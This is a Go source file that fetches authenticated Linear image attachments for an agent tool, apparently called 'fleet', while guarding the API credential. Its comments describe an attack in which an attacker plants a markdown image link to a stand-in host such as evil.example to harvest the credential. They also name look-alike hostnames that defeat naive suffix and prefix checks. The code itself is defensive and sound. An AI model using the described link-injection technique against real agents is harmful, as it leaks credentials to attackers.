package linear

import (
	"context"
	"fmt"
	"io"
	"mime"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// imageLinkRe matches a markdown image: ![alt](target). A narrow regex rather
// than a markdown parser — we only ever need the two capture groups, and the
// input is Linear's own markdown, not an arbitrary document.
var imageLinkRe = regexp.MustCompile(`!\[([^\]]*)\]\(([^)\s]+)\)`)

const uploadsHost = "uploads.linear.app"

// knownImageExt is the set of extensions we treat as already-correct, used both
// when recovering an extension and when stripping one off alt text.
var knownImageExt = map[string]struct{}{
	".png": {}, ".jpg": {}, ".jpeg": {}, ".gif": {}, ".webp": {}, ".bmp": {}, ".svg": {},
}

// extByContentType maps the types Linear actually serves for inline images.
var extByContentType = map[string]string{
	"image/png":     ".png",
	"image/jpeg":    ".jpg",
	"image/gif":     ".gif",
	"image/webp":    ".webp",
	"image/bmp":     ".bmp",
	"image/svg+xml": ".svg",
}

// imageRef is one image link found in an issue's markdown.
type imageRef struct {
	alt    string
	target string
}

// allowedImageURL reports whether a markdown image target is one fleet may
// fetch: https, and hosted on Linear's own upload host.
//
// This gate is the whole defence, and it is narrow on purpose. fetchImage
// attaches the live Linear credential — a raw personal API key, or an OAuth
// access token — to whatever URL it is handed. Issue descriptions and comments
// are attacker-influenced content: anyone who can write to an issue fleet later
// materializes (including through Linear's customer requests and public intake)
// could add `![x](http://evil.example/)` and be sent the credential directly.
//
// http is refused as well as foreign hosts, so the credential can never cross
// the network in plaintext even to Linear itself.
//
// The host comparison is on url.Host, never a string prefix or suffix: a
// suffix test matches evil-uploads.linear.app.evil.example, and a prefix test
// matches uploads.linear.app.evil.example. Port is stripped so an explicit
// :443 still matches.
func allowedImageURL(target string) bool {
	u, err := url.Parse(target)
	if err != nil {
		return false
	}
	return u.Scheme == "https" && u.Hostname() == uploadsHost
}

// findImages returns the remote image links in a body that fleet may fetch.
//
// Anything else — a relative path, a data URI, plain http, or a host that is
// not Linear's — is dropped here rather than downstream, so a body full of
// hostile links costs nothing and reaches no network stack at all.
func findImages(markdown []byte) []imageRef {
	var refs []imageRef
	for _, m := range imageLinkRe.FindAllSubmatch(markdown, -1) {
		target := string(m[2])
		if !allowedImageURL(target) {
			continue
		}
		refs = append(refs, imageRef{alt: string(m[1]), target: target})
	}
	return refs
}

// detectExt recovers a file extension for image bytes.
//
// This is not cosmetic. Linear's default alt text is literally "image.png" and
// its upload URLs carry no filename at all, so a real PNG would land on disk
// unnamed and unextensioned — and an agent's file-read tool dispatches on
// extension, making a perfectly downloaded screenshot unreadable. Recovering the
// extension is the difference between "we fetched it" and "the agent can see it".
//
// http.DetectContentType sniffs magic bytes, so it is the backstop when the
// response headers say nothing useful.
func detectExt(name string, body []byte) (string, bool) {
	if ext := strings.ToLower(filepath.Ext(name)); ext != "" {
		for _, known := range extByContentType {
			if ext == known {
				return ext, true
			}
		}
		if ext == ".jpeg" {
			return ".jpg", true
		}
	}
	ct := http.DetectContentType(body)
	if i := strings.IndexByte(ct, ';'); i >= 0 {
		ct = ct[:i]
	}
	ext, ok := extByContentType[strings.ToLower(strings.TrimSpace(ct))]
	return ext, ok
}

// fetchImage downloads one uploads.linear.app asset into destDir.
//
// These URLs are 401 unauthenticated, which is the whole reason this exists:
// an agent handed the raw markdown could not open a single screenshot. The
// credential is read per request and never written anywhere.
func fetchImage(ctx context.Context, url, destDir, alt string, index int) (string, int64, error) {
	// Re-checked here even though findImages already filtered, because this is
	// the line that attaches the credential. A gate one call away from the
	// thing it protects is a gate that a later refactor removes without
	// noticing; this one cannot be separated from the header it guards.
	if !allowedImageURL(url) {
		return "", 0, fmt.Errorf("refusing to send credentials to %q", url)
	}

	cred, err := credential()
	if err != nil {
		return "", 0, err
	}

	ctx, cancel := context.WithTimeout(ctx, imageFetchTimeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return "", 0, err
	}
	req.Header.Set("Authorization", cred.authHeader())

	// Do NOT reuse the shared httpClient here. Two independent reasons, and
	// each one alone would be enough:
	//
	// A redirect is a second URL that no gate has seen. Go strips Authorization
	// across a redirect only when the host changes *domain* — it deliberately
	// permits uploads.linear.app -> anything.linear.app, and a subdomain
	// takeover there would be handed the credential. Refusing every redirect
	// costs nothing: Linear serves these bytes directly.
	//
	// And the shared client carries a 90s timeout meant for GraphQL, while this
	// path already has its own imageFetchTimeout on the context.
	resp, err := imageClient.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", 0, fmt.Errorf("http %d", resp.StatusCode)
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, maxImageBytes+1))
	if err != nil {
		return "", 0, err
	}
	if len(body) == 0 {
		return "", 0, fmt.Errorf("empty response")
	}
	if len(body) > maxImageBytes {
		return "", 0, fmt.Errorf("over per-image cap")
	}

	// Reject anything that isn't an image, so a 401 HTML page or a JSON error
	// body can never land beside real screenshots looking like one.
	ext, ok := extFromHeaders(resp.Header)
	if !ok {
		if ext, ok = detectExt("", body); !ok {
			return "", 0, fmt.Errorf("not an image response")
		}
	}

	name := sanitizeFilename(alt, index) + ext
	if err := os.WriteFile(filepath.Join(destDir, name), body, 0644); err != nil {
		return "", 0, err
	}
	return name, int64(len(body)), nil
}

func extFromHeaders(h http.Header) (string, bool) {
	if cd := h.Get("Content-Disposition"); cd != "" {
		if _, params, err := mime.ParseMediaType(cd); err == nil {
			if fn := params["filename"]; fn != "" {
				if ext := strings.ToLower(filepath.Ext(fn)); ext != "" {
					if ext == ".jpeg" {
						return ".jpg", true
					}
					for _, known := range extByContentType {
						if ext == known {
							return ext, true
						}
					}
				}
			}
		}
	}
	ct := h.Get("Content-Type")
	if i := strings.IndexByte(ct, ';'); i >= 0 {
		ct = ct[:i]
	}
	ext, ok := extByContentType[strings.ToLower(strings.TrimSpace(ct))]
	return ext, ok
}
